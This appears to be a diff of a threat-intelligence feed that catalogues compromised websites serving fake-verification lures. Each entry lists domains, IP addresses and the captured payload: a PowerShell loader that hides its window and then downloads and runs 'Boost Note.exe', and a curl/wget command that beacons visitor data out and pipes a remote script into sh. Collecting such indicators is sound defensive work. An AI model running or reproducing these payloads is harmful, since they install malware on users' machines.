@@ -1,5 +1,24 @@
 [
   {
+    "UrlDomain": "futureexpected.com",
+    "DeliveryUrl": [
+      "fbifr.com"
+    ],
+    "PayloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "IP": [
+      "77.37.83.140"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "ReportId": "cmwjbc38k17of0omlpeppcn8t",
+    "ScannedAt": "2026-11-16T13:42:21.861000+00:00"
+  },
+  {
     "UrlDomain": "kiragu.co.ke",
     "DeliveryUrl": [
       "fbifr.com"
@@ -1712,32 +1731,5 @@
     ],
     "ReportId": "cmwhxb9mz0uf80omljhjnf4kl",
     "ScannedAt": "2026-11-15T14:22:02.682000+00:00"
-  },
-  {
-    "UrlDomain": "tccgcc.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "claude-flare-verification.vercel.app",
-      "modalelement.classlist.remove",
-      "spinnerelement.style.display"
-    ],
-    "PayloadUrl": [
-      "https://claude-flare-verification.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/win",
-      "https://claude-flare-verification.vercel.app/mac"
-    ],
-    "IP": [
-      "145.79.212.97"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=7f21b552-6a42-42e4-8e21-66bd283b97fa&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Ftccgcc[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T13%3A08%3A20.080Z&lastShellAt=2026-11-15T13%3A08%3A20.080Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/lin"
-    ],
-    "ReportId": "cmwhuqa3y0ubu0oml2z1942tq",
-    "ScannedAt": "2026-11-15T13:09:44.284000+00:00"
   }
 ]
